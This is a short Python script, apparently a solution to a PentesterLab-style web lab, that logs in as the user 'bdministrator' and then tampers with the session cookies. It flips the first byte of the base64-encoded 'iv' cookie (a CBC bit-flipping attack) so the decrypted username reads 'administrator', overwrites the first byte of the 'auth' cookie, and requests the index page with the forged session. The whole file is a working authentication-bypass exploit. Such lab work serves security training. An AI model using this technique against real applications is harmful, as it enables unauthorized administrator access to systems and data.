import requests
import base64

data = {
	'username' : 'bdministrator',
	'password' : 'Password1'
}

loginurl = 'http://ptl-ae3d292b-a8b7f48f.libcurl.so/login.php'
indexurl = 'http://ptl-ae3d292b-a8b7f48f.libcurl.so/index.php'

session = requests.Session()
r = session.post(loginurl, data=data)

iv = str(requests.utils.unquote(session.cookies['iv']))
sign = str(requests.utils.unquote(session.cookies['auth']))
iv_d = bytearray(base64.b64decode(iv.encode('utf-8')))
sign_d = bytearray(base64.b64decode(sign.encode('utf-8')))


iv_d[0] = (ord('a') ^ (ord('b') ^ iv_d[0]))
# first letter of user : from 'b' to 'a'(ascii=97)
sign_d[0] = 97

session.cookies['iv'] = requests.utils.quote(base64.b64encode(bytes(iv_d)).decode('utf-8'))
session.cookies['auth'] = requests.utils.quote(base64.b64encode(bytes(sign_d)).decode('utf-8'))

s = session.get(indexurl)
print(s.text)

